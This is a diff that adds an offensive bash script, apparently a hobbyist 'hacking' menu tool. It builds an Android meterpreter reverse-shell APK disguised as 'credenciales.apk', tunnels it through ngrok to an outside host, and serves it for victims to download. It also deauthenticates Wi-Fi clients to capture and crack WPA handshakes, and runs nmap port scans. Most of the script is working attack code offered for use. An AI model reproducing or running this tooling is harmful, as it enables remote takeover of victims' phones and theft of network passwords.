@@ -1,0 +1,307 @@
+#!/bin/bash
+
+#script created by Yenot-Hack
+
+#INITION
+
+#colors
+RED="$(printf '\033[31m')"          GREEN="$(printf '\033[32m')"        ORANGE="$(printf '\033[33m')"       BLUE="$(printf '\033[34m')"
+MAGENTA="$(printf '\033[35m')"      CYAN="$(printf '\033[36m')"         WHITE="$(printf '\033[37m')"        BLACK="$(printf '\033[30m')"        RESET="$(printf '\033[0m')"
+end="$(printf '\033[0m')"
+trap '' SIGINT SIGQUIT SIGTSTP
+function closer()
+{
+  echo "          +------------------------------------------+"
+  printf "          | %-40s |\n" "`date`"
+  echo "          |                                          |"
+  printf "          |`tput bold` %-40s `tput sgr0`|\n" "$@"
+  echo "          +------------------------------------------+"
+}
+
+#banner
+function banner_init() {
+      echo ""
+      echo "$RED      ##### ##          # ###     $ORANGE       # ### ";
+      echo "$RED   ######  /### /     /  /###  /  $ORANGE      /  /###  / ";
+      echo "$RED  /#   /  /  ##/     /  /  ###/   $ORANGE    /  /  ###/ ";
+      echo "$RED /    /  /    #     /  ##   ##    $ORANGE   /  ##   ## ";
+      echo "$RED     /  /          /  ###         $ORANGE  /  ### ";
+      echo "$RED    ## ##         ##   ##         $ORANGE ##   ##        ###  /###       /###    ###  /###       /###       /### ";
+      echo "$RED    ## ##         ##   ##   ###   $ORANGE ##   ##         ###/ #### /   / ###  /  ###/ #### /   / ###  /   / #### / ";
+      echo "$RED    ## ######     ##   ##  /###  /$ORANGE ##   ##          ##   ###/   /   ###/    ##   ###/   /   ###/   ##  ###/ ";
+      echo "$RED    ## #####      ##   ## /  ###/ $ORANGE ##   ##          ##         ##    ##     ##    ##   ##    ##   #### ";
+      echo "$RED    ## ##         ##   ##/    ##  $ORANGE ##   ##          ##         ##    ##     ##    ##   ##    ##     ### ";
+      echo "$RED    #  ##          ##  ##     #   $ORANGE  ##  ##          ##         ##    ##     ##    ##   ##    ##       ### ";
+      echo "$RED       #            ## #      /   $ORANGE   ## #      /    ##         ##    ##     ##    ##   ##    ##         ### ";
+      echo "$RED   /####             ###     /    $ORANGE    ###     /     ##         ##    ##     ##    ##   ##    ##    /###  ## ";
+      echo "$RED  /  #####            ######/     $ORANGE     ######/      ###         ######      ###   ###   ######    / #### / ";
+      echo "$RED /    ###               ###       $ORANGE       ###         ###         ####        ###   ###   ####        ###/ ";
+      echo "$RED # ";
+      echo "$RED  ## ";
+      echo -e "$RED                                                           Created by: Yenot-Hack & Zetgit"$(printf '\033[0m')
+
+}
+
+#menu
+function menu_init() {
+      function options () {
+            echo "
+            ${GREEN}[1]WIFI-CRACKER   [2]INFO
+            [3]SERVER_UP      [4]CREATION_OF_PAYLOADS
+            [0]EXIT${end}
+"
+echo -e "\n"
+      }
+      
+      function read_options () {
+            local choice
+            read -p "Select an Option: " choice
+            case $choice in
+                  1) wifiHacking ;;
+                  2) ip_info ;;
+                  3) server ;;
+                  4) payloads ;;
+                  0) exit 1 | clear ;;
+                  *) echo -e "${RED}[!]${WHITE}Invalid Option...${RED}[!]" && sleep 2 && fgcronos
+            esac
+      }
+      options
+      read_options
+}
+function bar_progress() {
+      tput civis
+      typeset -i i=0
+      while [ $i -le "25" ]
+      do
+      echo -e "\033[44m\033[30m \033[0m \\c"
+      sleep 1
+      i=i+1
+      done
+      tput cnorm
+}
+
+#kill process
+function kill_process() {
+      checkng=$(ps aux | grep -o "ngrok" | head -n1)
+      checkphp=$(ps aux | grep -o "php" | head -n1)
+      if [[ $checkng == *'ngrok'* ]]; then
+            pkill -f -2 ngrok > /dev/null 2>&1
+            killall -2 ngrok > /dev/null 2>&1
+      fi
+      if [[ $checkphp == *'php'* ]]; then
+            pkill -f -2 php > /dev/null 2>&1
+            killall -2 php > /dev/null 2>&1
+      fi
+
+}
+
+#Payload's
+function payloads() {
+      kill_process
+      enlace(){
+            #if [[ $clonada == "si" ]];then
+            #descargando_pagina
+            #fi
+            echo
+            php -S localhost:3333 > /dev/null 2>&1 &
+            #findngrok
+            ./ngrok tcp 3333 > /dev/null 2>&1 &
+            sleep 1
+            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://*[0-9].tcp.ngrok.io:*[0-9]*[0-9]")
+            if [[ $link == "" ]];then
+                echo -e "[!] Server isn't raised "
+                exit 1
+            else
+                alv="${link#??????}"
+                alv2="${alv%??????}"
+                lhostp=$(dig +short $alv2)
+                lport="${link#?????????????????????}"
+            fi
+      }
+      enlace
+      USR=$(logname)
+      IP_L1=$(nmcli | grep inet4)
+      IP_L2="${IP_L1#???????}"
+      IP_L3="${IP_L2%???}"
+      clear
+      if [[ -e /var/www/html/credenciales.apk ]]; then
+            rm -rf /var/www/html/*.apk
+            closer "Creating Payloads..."
+            msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhostp LPORT=$lportp R > /var/www/html/credenciales.apk > /dev/null 2>&1 | bar_progress
+            chown $USR /var/www/html/*.apk | chmod 0755 /var/www/html/*.apk
+            clear
+            closer "Done   Payloads mount ✅"
+      else
+            closer "Creating Payloads..."
+            msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhostp LPORT=$lportp R > /var/www/html/credenciales.apk > /dev/null 2>&1 | bar_progress
+            chown $USR /var/www/html/*.apk | chmod 0755 /var/www/html/*.apk
+            clear
+            closer "Payloads mount.✅"
+      fi
+      echo -e "\nYour link of Download is: http://$IP_L3/credenciales.apk\n"
+      echo -e "\nThe ip of the metasploit session is: $lhostp "
+      echo -e "\nThe port of the metasploit session is: $lportp"
+      echo -e "\nThe commands for the sploit are: \n use exploit/multi/handler \n set payload/meterpreter/reverse_tcp \n set LHOST $lhostp \n set LPORT $lportp \n exploit."
+      msfconsole
+}
+
+
+#Wifi-cracken
+function server() {
+      if systemctl status apache2 | grep active > /dev/null 2>&1 ; then
+            printf "\nApache server is raised ✅\n"
+      else
+            printf "\nStartting the server apache...\n\n"
+            bar_progress ; printf "\n"
+            service apache2 start
+            printf "\nApache server raised ✅\n"
+      fi
+}
+
+#phishing
+function wifiHacking() {
+      
+      clear
+      Red="\e[1;91m"      ##### Colors Used #####
+      Green="\e[0;92m"
+      Yellow="\e[0;93m"
+      Blue="\e[1;94m"
+      White="\e[0;97m"
+
+      handshakeWait=2        ##### Time, how long aircack-ng waits for handshake in minute #####
+
+      checkDependencies () {        ##### Check if aircrack-ng is installed or not #####
+            if [ $(dpkg-query -W -f='${Status}' aircrack-ng 2>/dev/null | grep -c "ok installed") -eq 0 ]; then
+                  echo -e "Installing aircrack-ng\n\n"
+                  sudo apt-get install aircrack-ng -y;
+            fi
+      }
+
+      checkWiFiStatus () {        ##### Check if wlan0 is enabled or not #####
+            WiFiStatus=$(nmcli radio wifi)
+            if [ "$WiFiStatus" == "disabled" ]; then
+                  nmcli radio wifi on
+                  echo -e "[${Green}wlan0${White}] Enabled!"
+            fi
+      }
+
+      wifiHacking () {        ##### Sending DeAuth and capture handshake #####
+            monitor
+            airodump-ng --bssid "$bssid" --channel "$channel" --output-format pcap --write handshake wlan0mon > /dev/null &
+            echo -e "[${Green}wlan0mon${White}] Sending DeAuth to target..."
+            x-terminal-emulator -e aireplay-ng --deauth 20 -a "$bssid" wlan0mon
+            wordlist
+            echo -e "[${Green}Status${White}] Waiting for Handshake Packet..."
+            counter=0
+            while true; do
+                  sleep 10
+                  echo -e "[${Green}Status${White}] Checking for Handshake Packet..."
+                  aircrack-ng -w "$fileLocation" handshake-01.cap > logs/password 2> logs/error
+                  if [ $? -eq 0 ] || [ $counter -eq $(($handshakeWait*3)) ]; then
+                        break
+                  fi
+                  sleep 10
+                  echo -e "[${Red}!${White}] Can't find Handshake, waiting ..."
+                  counter=$((counter+1))
+            done
+            kill $!
+            airmon-ng stop wlan0mon > /dev/null
+            rm handshake-01.cap
+            if grep "unable" logs/error > /dev/null; then
+                  echo -e "[${Red}$targetName${White}] Exiting can't find Handshake Packet..."
+                  sleep 0.5
+                  echo -e "[${Yellow}Warning${White}] Make sure at least one client is connected to network..."
+                  exit 1
+            elif grep "NOT" logs/password > /dev/null; then
+                  echo -e "[${Green}$targetName${White}] Captured Handshake..."
+                  sleep 0.5
+                  echo -e "[${Red}$targetName${White}] Can't find password..."
+                  sleep 0.5
+                  echo -e "[${Yellow}Warning${White}] Try using custom wordlist..."
+                  exit 1
+            elif grep "FOUND!" logs/password > /dev/null; then
+                  key=$(grep "FOUND!" logs/password | cut -d " " -f4 | uniq)
+                  echo -e "[${Green}$targetName${White}] Captured Handshake... ☑"
+                  sleep 0.5
+                  echo -e "[${Green}$targetName${White}] Password for network is: \e[4;97m$key${White}\n"
+                  exit 0
+            else
+                  echo -e "[${Red}!${White}] Unknown error is occured..."
+                  sleep 0.5
+                  echo -e "[${Yellow}GitHub${White}] You can pelarmela :v"
+                  echo -e "[${Yellow}GitHub${White}] Do paste content of password and error log files..."
+                  exit 1
+            fi
+      }
+
+      wordlist () {        ##### Enter path to wordlist or use default #####
+            read -p $'[\e[0;92mInput\e[0;97m] Path to wordlist (Press enter to use default): ' fileLocation
+            if [ -z "$fileLocation" ]; then
+                  fileLocation="${parameter:-dictionary/defaultWordList.txt}"
+                  return 0
+            elif [[ -f "$fileLocation" ]]; then
+                  return 0
+            fi
+                  echo -e "[${Red}!$White] File doesn't exist..."
+            wordlist
+      }
+
+      monitor () {        ##### Monitor mode, scan available networks & select target #####
+            spinner &
+            airmon-ng start wlan0 > /dev/null
+            trap "airmon-ng stop wlan0mon > /dev/null; rm generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
+            airodump-ng --output-format kismet --write generated wlan0mon > /dev/null & sleep 20 ; kill $!
+            sed -i '1d' generated-01.kismet.csv
+            kill %1
+            echo -e "\n\n${Red}SerialNo        WiFi Network${White}"
+            cut -d ";" -f 3 generated-01.kismet.csv | nl -n ln -w 8
+            targetNumber=1000
+            while [ ${targetNumber} -gt $(wc -l generated-01.kismet.csv | cut -d " " -f 1) ] || [ ${targetNumber} -lt 1 ]; do 
+                  echo -e "\n${Green}┌─[${Red}Select Target${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
+                  read -p "└─────►$(tput setaf 7) " targetNumber
+            done
+            targetName=$(sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 3 )
+            bssid=$(sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 4 )
+            channel=$(sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 6 )
+            rm generated-01.kismet.csv 2> /dev/null
+            echo -e "\n[${Green}${targetName}${White}] Preparing for attack..."
+      }
+
+      spinner() {        ##### Animation while scanning for available networks #####
+            sleep 2
+            echo -e "[${Green}wlan0mon${White}] Preparing for scan..."
+            sleep 3
+            spin='/-\|'
+            length=${#spin}
+            while sleep 0.1; do
+                  echo -ne "[${Green}wlan0mon${White}] Scanning for available networks...${spin:i--%length:1}" "\r"
+            done
+      }
+
+      lazyaircrack () {
+      checkDependencies
+      checkWiFiStatus
+      wifiHacking
+      }
+
+      lazyaircrack
+}
+
+#ip_info
+function ip_info() {
+      { clear;  }
+      echo -ne "\nEnter the ip: "
+      read ip
+      clear
+      closer "Scanning the ip: $ip"
+      bar_progress; clear
+      closer "IP scaned: $ip | Results:"
+      echo -e "\nOpen ports\n"
+      nmap -p- $ip | tail -n +5 | head -n -2
+      echo -e "\nDone ✅\n"
+}
+
+#INITIALITATION OF SCRIPT
+clear
+banner_init
+menu_init
